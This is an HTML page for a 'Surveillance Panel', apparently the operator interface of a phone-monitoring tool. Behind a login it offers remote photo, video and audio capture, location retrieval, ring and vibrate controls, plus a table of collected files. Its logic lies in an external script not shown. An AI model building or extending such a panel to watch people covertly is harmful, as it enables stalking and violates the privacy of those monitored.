<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surveillance Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .file-table img { max-width: 100px; }
        .file-table video, .file-table audio { max-width: 200px; }
    </style>
</head>
<body class="bg-light">
    <div class="container py-5">
        <h1 class="text-center mb-4">Surveillance Panel</h1>
        <!-- Login Section -->
        <div id="login-section" class="card p-4 mx-auto" style="max-width: 400px;">
            <h3 class="text-center">Login</h3>
            <div class="mb-3">
                <input id="email" type="email" class="form-control" placeholder="Email">
            </div>
            <div class="mb-3">
                <input id="password" type="password" class="form-control" placeholder="Password">
            </div>
            <button id="login" class="btn btn-primary w-100">Login</button>
            <div id="error-message" class="text-danger text-center mt-2"></div>
        </div>
        <!-- Commands Section -->
        <div id="commands-section" class="d-none">
            <div class="card p-4 mb-4">
                <h3>Commands</h3>
                <!-- Capture Photo -->
                <div class="mb-3">
                    <label class="form-label">Capture Photo</label>
                    <select id="photo-camera" class="form-select mb-2">
                        <option value="rear">Rear Camera</option>
                        <option value="front">Front Camera</option>
                    </select>
                    <select id="photo-flash" class="form-select mb-2">
                        <option value="off">Flash Off</option>
                        <option value="on">Flash On</option>
                    </select>
                    <button id="capturePhoto" class="btn btn-success w-100">Capture Photo</button>
                </div>
                <!-- Record Video -->
                <div class="mb-3">
                    <label class="form-label">Record Video</label>
                    <select id="video-camera" class="form-select mb-2">
                        <option value="rear">Rear Camera</option>
                        <option value="front">Front Camera</option>
                    </select>
                    <select id="video-quality" class="form-select mb-2">
                        <option value="low">Low Quality</option>
                        <option value="medium">Medium Quality</option>
                        <option value="high">High Quality</option>
                    </select>
                    <select id="video-duration" class="form-select mb-2">
                        <option value="5">5 seconds</option>
                        <option value="10">10 seconds</option>
                        <option value="30">30 seconds</option>
                    </select>
                    <button id="recordVideo" class="btn btn-success w-100">Record Video</button>
                </div>
                <!-- Record Audio -->
                <div class="mb-3">
                    <label class="form-label">Record Audio</label>
                    <select id="audio-duration" class="form-select mb-2">
                        <option value="5">5 seconds</option>
                        <option value="10">10 seconds</option>
                        <option value="30">30 seconds</option>
                    </select>
                    <button id="recordAudio" class="btn btn-success w-100">Record Audio</button>
                </div>
                <!-- Get Location -->
                <div class="mb-3">
                    <label class="form-label">Get Location</label>
                    <button id="getLocation" class="btn btn-success w-100">Get Current Location</button>
                </div>
                <!-- Ring -->
                <div class="mb-3">
                    <label class="form-label">Ring</label>
                    <button id="ring" class="btn btn-success w-100">Ring (5s)</button>
                </div>
                <!-- Vibrate -->
                <div class="mb-3">
                    <label class="form-label">Vibrate</label>
                    <button id="vibrate" class="btn btn-success w-100">Vibrate (1s)</button>
                </div>
                <button id="logout" class="btn btn-danger w-100">Logout</button>
            </div>
            <!-- File Management -->
            <div class="card p-4">
                <h3>Files</h3>
                <table class="table table-striped file-table">
                    <thead>
                        <tr>
                            <th>Type</th>
                            <th>Preview</th>
                            <th>Path</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="files-table"></tbody>
                </table>
                <h3>Last Location</h3>
                <div id="location-data" class="mb-3"></div>
            </div>
        </div>
    </div>
    <script type="module" src="script.js"></script>
</body>
</html>
